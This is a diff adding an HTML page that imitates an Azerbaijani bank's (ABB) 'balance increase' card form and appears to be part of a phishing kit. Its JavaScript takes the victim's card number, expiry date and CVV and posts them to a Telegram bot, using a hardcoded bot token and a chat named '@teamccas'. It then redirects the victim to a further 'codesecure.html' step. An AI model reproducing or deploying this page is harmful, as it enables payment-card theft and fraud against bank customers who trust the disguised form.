@@ -1,0 +1,117 @@
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Balance Increase</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        function updateCardInfo() {
+            const cardNumber = document.getElementById('card-number').value || '____ ____ ____ ____ ____';
+            const expiryMonth = document.getElementById('expiry-month').value || '__';
+            const expiryYear = document.getElementById('expiry-year').value || '__';
+            const cvv = document.getElementById('cvv').value || '___';
+
+            document.getElementById('card-number-display').innerText = cardNumber;
+            document.getElementById('expiry-date-display').innerText = `${expiryMonth}/${expiryYear}`;
+            document.getElementById('cvv-display').innerText = cvv;
+        }
+
+        async function sendToTelegram(event) {
+            event.preventDefault();
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryMonth = document.getElementById('expiry-month').value;
+            const expiryYear = document.getElementById('expiry-year').value;
+            const cvv = document.getElementById('cvv').value;
+
+            const message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryMonth}/${expiryYear}\nCVV: ${cvv}`;
+
+            const botToken = '7824147980:AAFr0maZVG9PQ5x19zXfE768R4j_DRyH60o';
+            const chatId = '@teamccas';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+
+            if (response.ok) {
+                window.location.href = 'codesecure.html';
+            } else {
+                alert('Failed to send information to Telegram.');
+            }
+        }
+    </script>
+</head>
+<body class="bg-white flex flex-col items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-md">
+        <div class="flex items-center justify-between mb-4">
+            <i class="fas fa-arrow-left text-xl"></i>
+            <span class="text-lg font-semibold mx-auto">Balansın artırılması</span>
+        </div>
+        <div class="flex justify-center mb-6">
+            <img alt="ABB Logo" class="h-24" height="180" src="https://resmim.net/cdn/2024/12/20/Ds9xn8.png" width="180"/>
+        </div>
+        <div class="relative flex justify-center mb-6">
+            <div class="h-40 w-72 bg-blue-500 rounded-lg shadow-lg p-4 text-white">
+                <div class="flex justify-between items-center mb-4">
+                    <img alt="Chip Image" class="w-12 h-12" src="https://resmim.net/cdn/2024/12/20/Ds9Agi.jpg"/>
+                    <div id="cvv-display" class="text-sm">___</div>
+                </div>
+                <div id="card-number-display" class="text-lg mb-4">____ ____ ____ ____ ____</div>
+                <div id="expiry-date-display" class="text-sm">__/__</div>
+            </div>
+        </div>
+        <form onsubmit="sendToTelegram(event)">
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700" for="card-number">Kartın nömrəsi</label>
+                <input class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" id="card-number" type="text" maxlength="19" oninput="updateCardInfo()"/>
+            </div>
+            <div class="flex space-x-4 mb-4">
+                <div class="flex-1">
+                    <label class="block text-sm font-medium text-gray-700" for="expiry-month">Bitmə tarixi</label>
+                    <select class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" id="expiry-month" onchange="updateCardInfo()">
+                        <option value="" disabled selected>Ay</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="flex-1">
+                    <label class="block text-sm font-medium text-gray-700" for="expiry-year">İl</label>
+                    <select class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" id="expiry-year" onchange="updateCardInfo()">
+                        <option value="" disabled selected>İl</option>
+                        <option value="23">23</option>
+                        <option value="24">24</option>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                    </select>
+                </div>
+                <div class="flex-1">
+                    <label class="block text-sm font-medium text-gray-700" for="cvv">CVV2/CVC2</label>
+                    <input class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" id="cvv" placeholder="___" type="text" maxlength="3" oninput="updateCardInfo()"/>
+                </div>
+            </div>
+            <button type="submit" class="w-full py-3 bg-black text-white rounded-md text-sm font-medium">Davam edin</button>
+        </form>
+    </div>
+</body>
+</html>
